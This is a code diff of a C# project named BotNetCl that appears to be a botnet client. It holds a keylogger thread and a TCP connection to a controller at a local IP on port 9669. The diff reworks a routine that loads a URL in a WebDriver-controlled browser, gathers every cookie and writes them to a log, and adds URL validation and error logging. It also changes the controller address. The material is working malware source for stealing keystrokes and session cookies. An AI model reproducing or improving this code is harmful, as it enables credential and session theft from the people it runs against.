@@ -25,7 +25,7 @@ namespace BotNetCl
         private const int PORT_NUMBER = 9669;
         static Thread th_doKeylogger;
         static Thread th_socket;
-        static Thread th_cmd;
+
 
         static ASCIIEncoding encoding = new ASCIIEncoding();
         [DllImport("user32.dll")]
@@ -341,30 +341,60 @@ namespace BotNetCl
         {
             return c < 128;
         }
-
+        static bool IsUrlValid(string url)
+        {
+            Uri result;
+            return Uri.TryCreate(url, UriKind.Absolute, out result) && (result.Scheme == Uri.UriSchemeHttp || result.Scheme == Uri.UriSchemeHttps);
+        }
         public static void getCookies(IWebDriver driver, string url)
         {
             try
             {
-                // Navigate to Url
-                driver.Navigate().GoToUrl(url);  
-                // Get All available cookies
-                var cookies = driver.Manage().Cookies.AllCookies;
-                string cookiesString = "";
-                foreach (var cookie in cookies)
+                driver.Navigate().GoToUrl(url);
+                string currentUrl = driver.Url;
+                if (IsUrlValid(currentUrl))
                 {
-                    //Console.WriteLine($"Name: {cookie.Name}, Value: {cookie.Value}");
-                    cookiesString += $"{cookie.Name}={cookie.Value};";
-                    // Console.Write($"{cookie.Name}={cookie.Value};");
+                    var cookies = driver.Manage().Cookies.AllCookies;
+                    string cookiesString = "";
+                    foreach (var cookie in cookies)
+                    {
+                        cookiesString += $"{cookie.Name}={cookie.Value};";
+                    }
+                    string logNameToWrite = "cookies" + logExtendtion;
+                    StreamWriter sw = new StreamWriter(logNameToWrite, true);
+                    sw.WriteLine(DateTime.Now);
+                    sw.WriteLine(url);
+                    sw.WriteLine(cookiesString);
+                    sw.WriteLine("----------------------------------------------------------------------------------------");
+                    sw.Close();
+                    
                 }
-                string logNameToWrite = "cookies"  + logExtendtion;
+                else
+                {
+                    Console.WriteLine("Invalid URL.");
+                    string logNameToWrite = "cookies" + logExtendtion;
+                    StreamWriter sw = new StreamWriter(logNameToWrite, true);
+                    sw.WriteLine(DateTime.Now);
+                    sw.WriteLine(url);
+                    sw.WriteLine("Url invalid. Url must starts with https://www...");
+                    sw.WriteLine("----------------------------------------------------------------------------------------");
+                    sw.Close();
+                }
+
+            }
+            catch (Exception e)
+            {
+                // Handle the exception
+                Console.WriteLine("Navigation failed: " + e.Message);
+
+                Console.WriteLine("Invalid URL.");
+                string logNameToWrite = "cookies" + logExtendtion;
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
                 sw.WriteLine(DateTime.Now);
                 sw.WriteLine(url);
-                sw.WriteLine(cookiesString);
+                sw.WriteLine("erro: "+ e.Message);
                 sw.WriteLine("----------------------------------------------------------------------------------------");
                 sw.Close();
-
             }
             finally
             {
@@ -506,7 +536,7 @@ namespace BotNetCl
                 TcpClient client = new TcpClient();
 
                 // 1. connect
-                client.Connect("192.168.1.100", PORT_NUMBER);
+                client.Connect("192.168.1.101", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 Console.WriteLine("connect xong socket");
             
